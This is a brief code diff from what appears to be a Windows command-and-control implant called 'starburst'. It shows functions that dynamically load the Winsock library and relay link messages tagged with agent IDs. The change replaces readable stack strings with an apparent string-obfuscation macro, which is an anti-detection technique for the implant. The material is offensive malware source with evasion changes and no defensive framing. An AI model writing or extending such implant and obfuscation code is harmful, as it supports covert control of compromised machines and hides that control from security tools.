@@ -19,7 +19,7 @@ auto declfn starburst::tcp_resolve_ws2(
 
     memory::zero( &state->ws, sizeof( TcpWsApis ) );
 
-    char ws2_name[] = { 'w','s','2','_','3','2','.','d','l','l', 0 };
+    xstr(ws2_name, "ws2_32.dll");
     state->h_ws2 = inst.kernel32.LoadLibraryA( ws2_name );
     if ( !state->h_ws2 ) return false;
 
@@ -219,7 +219,7 @@ auto declfn starburst::tcp_poll_links(
                 if ( dpkg ) {
                     starburst::package_add_byte( inst, dpkg, ACTION_LINK_MSG );
                     starburst::package_add_string( inst, dpkg, cur->agent_id ?
-                        cur->agent_id : symbol<char*>( const_cast<char*>( "" ) ) );
+                        cur->agent_id : XSTR( "" ) );
                     starburst::package_add_bytes( inst, dpkg, msg_buf, msg_size );
 
                     uint32_t dlen = 0;
